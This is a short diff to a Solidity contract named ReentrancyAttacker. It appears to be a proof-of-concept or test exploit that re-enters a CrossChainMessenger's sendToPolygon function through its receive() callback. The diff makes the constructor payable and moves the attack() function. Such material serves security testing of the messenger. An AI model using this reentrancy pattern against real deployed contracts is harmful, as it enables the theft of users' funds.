@@ -12,17 +12,9 @@ contract ReentrancyAttacker {
     event AttackAttempted(uint256 value, uint256 count);
     event FallbackCalled(uint256 value);
 
-    constructor(address payable _messenger) {
+    constructor(address _messenger) payable {
         require(_messenger != address(0), "Invalid messenger address");
         messenger = CrossChainMessenger(_messenger);
-    }
-
-    function attack() external payable {
-        require(msg.value >= ATTACK_VALUE + FEE_BUFFER, "Need at least 1.1 ETH"); // Extra for fees
-        attackCount = 0;
-        // Send enough to cover both transfer and fee
-        messenger.sendToPolygon{value: msg.value}(address(this));
-        emit AttackAttempted(msg.value, 0);
     }
 
     receive() external payable {
@@ -34,5 +26,13 @@ contract ReentrancyAttacker {
             messenger.sendToPolygon{value: ATTACK_VALUE + FEE_BUFFER}(address(this));
             emit AttackAttempted(ATTACK_VALUE + FEE_BUFFER, attackCount);
         }
+    }
+
+    function attack() external payable {
+        require(msg.value >= ATTACK_VALUE + FEE_BUFFER, "Need at least 1.1 ETH"); // Extra for fees
+        attackCount = 0;
+        // Send enough to cover both transfer and fee
+        messenger.sendToPolygon{value: msg.value}(address(this));
+        emit AttackAttempted(msg.value, 0);
     }
 }
